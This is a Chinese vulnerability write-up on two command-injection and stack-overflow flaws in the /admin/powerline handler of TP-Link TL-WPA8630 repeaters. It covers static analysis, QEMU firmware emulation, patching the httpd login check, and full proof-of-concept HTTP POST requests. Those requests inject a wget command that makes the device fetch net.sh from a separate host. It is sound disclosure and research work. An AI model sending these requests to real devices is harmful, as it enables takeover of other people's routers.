# TPLink 中继器设备命令注入漏洞分析及复现
> ChaMd5
> 来源：https://www.iotsec-zone.com/article/366

写在前面：
在分析TPlink中继器设备时（这里以TL-WPA8630为代表），发现了两处可以利用的命令注入和栈溢出漏洞，因此借这个机会，将TPlink此类设备的模拟方法也进行了研究，并在本地对漏洞进行了复现。相关漏洞已经提交至CVE官网。

漏洞介绍：
在httpd文件处理admin/powerline的sub_40A918函数中，存在两处命令注入漏洞（也可以构造栈溢出）。对plc_device对应的key参数、plc_add对应的devicePwd参数不加过滤，直接vsprintf拼接执行，造成命令注入，也可以实现栈溢出攻击。
版本：TL-WPA8630 KIT(US)_V2_171011版，以及其他WPA、WR、WA等电力猫与中继器设备对应版本。

**漏洞静态分析**
httpd文件调用sub_40A918处理/admin/powerline的对应请求：

![0.png](https://www.iotsec-zone.com/images/MdImg/8ecfa201d5ceca0eff32fe2be90e33b4.png)

sub_40A918首先判断form参数，如果form参数是plc_device，则交给sub_40A774函数处理，如果form参数是plc_add，则交给sub_40A80C函数处理，这两个函数都有漏洞，我们依次分析。

![1.png](https://www.iotsec-zone.com/images/MdImg/123cc8352e88dab8caa175ac30f1eb49.png)

sub_40A774函数如下，获取operation参数，如果参数是remove，则获取后续key参数，然后将key交给sub_4036A0函数处理，后续会将key的参数直接用vsprintf凭借，然后执行，既可以实现命令注入，又可以实现栈溢出。

![2.png](https://www.iotsec-zone.com/images/MdImg/9c5946b99a3bad09c9b46c7facd5fe5e.png)
![3.png](https://www.iotsec-zone.com/images/MdImg/2a4332039d97330eb3d558bc1136133c.png)
![4.png](https://www.iotsec-zone.com/images/MdImg/c7b3b2182e7bf46bdd45a58739859316.png)

sub_40A80C函数如下，获取operation参数，如果参数是write，则获取后续devicePwd参数，然后将其交给sub_4036A0函数处理，同上述一样，既可以实现命令注入，又可以实现栈溢出。

![5.png](https://www.iotsec-zone.com/images/MdImg/56cc22f6bf28a5847943c8b7be654819.png)

**固件模拟**
基本步骤和往常的设备模拟一样，利用qemu进行系统模拟，命令如下：

```
#qemu系统模式启动
sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
#主机网卡配置
#! /bin/sh 
sudo sysctl -w net.ipv4.ip_forward=1 
sudo iptables -F 
sudo iptables -X 
sudo iptables -t nat -F 
sudo iptables -t nat -X 
sudo iptables -t mangle -F 
sudo iptables -t mangle -X 
sudo iptables -P INPUT ACCEPT 
sudo iptables -P FORWARD ACCEPT 
sudo iptables -P OUTPUT ACCEPT 
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE 
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT 
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT 
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
#qemu网卡配置
#！/bin/sh 
ifconfig eth0 192.168.100.2 netmask 255.255.255.0 
route add default gw 192.168.100.254
#文件系统上传
scp -r squashfs-root/ root@192.168.100.2:~/
#挂载执行：
mount -o bind /dev ./squashfs-root/dev
mount -t proc /proc ./squashfs-root/proc
chroot squashfs-root sh

```

在完成基本环境搭建后，下面还是最困难的问题，启动设备的web服务，直接启动httpd文件：

```
./usr/bin/httpd

```

发现没有任何报错，然后我们访问对应对应IP：[http://192.168.100.2/index.html](http://192.168.100.2/index.html)， 居然直接成功访问登录界面：

![6.png](https://www.iotsec-zone.com/images/MdImg/2b9f95caad005eb95af564f0be0d4bc6.png)

心里非常惊喜，以为模拟成功，结果发现并没有。输入TPLink的初始用户名和密码：admin、admin，结果提示，用户名和密码错误。按理来说，此设备的默认密码就是admin，但是发生了错误，说明问题出现在登录时的密码验证环节。我们用burpsuite抓一下登陆时的数据包，发现设备会将输入的用户名和密码写入Cookie的Authorization字段。

![7.png](https://www.iotsec-zone.com/images/MdImg/eb8e343f0b39879f026ff15d6b161579.png)

我们在IDA里逆向对应的处理流程，程序会先读取Authorization字段，然后在sub_4269B4函数中进行了处理，并进行了分支跳转。盲猜sub_4269B4函数功能就是对登录字段进行校验。

![8.png](https://www.iotsec-zone.com/images/MdImg/a11e3d8671904ffafdcb7bfa5610e9fc.png)

分析sub_4269B4函数，发现该函数确实在进行授权校验，主要原理就是将Authorization字段，同config文件夹下的account.config配置文件中的对应结果进行匹配，匹配失败则返回-1。由于我们直接对解包后的文件系统进行模拟的缘故，config文件夹下并没有相关配置文件，因此登录时会验证失败。

![9.png](https://www.iotsec-zone.com/images/MdImg/e83473ce59cd087a15148d01b75e5130.png)

因此，我们要么构造一个符合TPlink结构的config配置文件，要么直接对登录流程进行patch，我们当然选择比较简单的patch方法，只需要将登录的验证跳转分支修改即可。我们将sub_4269B4函数判断改为-1登陆成功，也就是将bltz指令改为bgez指令即可。

![10.png](https://www.iotsec-zone.com/images/MdImg/0d1235e4d5813c849acd9832fe6f074d.png)

将新的httpd文件上传至qemu，此时输入admin、admin，即可成功登入主界面（其实此时应该是任意用户名和密码都可以登入了）：

![11.png](https://www.iotsec-zone.com/images/MdImg/84242d8b4a1465edc0d808886325bf48.png)

**漏洞动态复现**
我们分别对两个漏洞点进行复现，在这里我们采用wget命令，验证能否下载文件来证明命令注入成功，在ubuntu中用python搭建简易的web服务器：

```
python3 -m http.server

```

首先是plc_device对应的漏洞，发送数据包如下：

```
POST /admin/powerline HTTP/1.1
Host: 192.168.100.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 63
Origin: http://192.168.100.2
Connection: close
Referer: http://192.168.100.2/
Cookie: Authorization=Basic%20admin%3A21232f297a57a5a743894a0e4a801fc3

xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh; 

#不过实际抓包时，发现form参数是跟在POST的URL后面传的，不过两种传参都可以
POST /admin/powerline?form=plc_device HTTP/1.1

```

成功实现对恶意文件net.sh的下载：

![12.png](https://www.iotsec-zone.com/images/MdImg/a5b97f01464d33cd3ba3f4dc55fbe79e.png)

其次是plc_add对应的漏洞，发送数据包如下：

```POST /admin/powerline HTTP/1.1
Host: 192.168.100.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Origin: http://192.168.100.2
Connection: close
Referer: http://192.168.100.2/
Cookie: Authorization=Basic%20admin%3A21232f297a57a5a743894a0e4a801fc3

xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh; 

#不过实际抓包时，发现form参数是跟在POST的URL后面传的，不过两种传参都可以
POST /admin/powerline?form=plc_add HTTP/1.1

```

成功实现对恶意文件net.sh的下载：

![13.png](https://www.iotsec-zone.com/images/MdImg/d2588aacd91209fe00b7741336f7cb88.png)

以上为漏洞复现全过程，主要实现了对该品牌此类设备的模拟，并将漏洞进行了实际复现，相关设备具有较多的部署和资产，因此需要用户及时更新设备版本。

-end
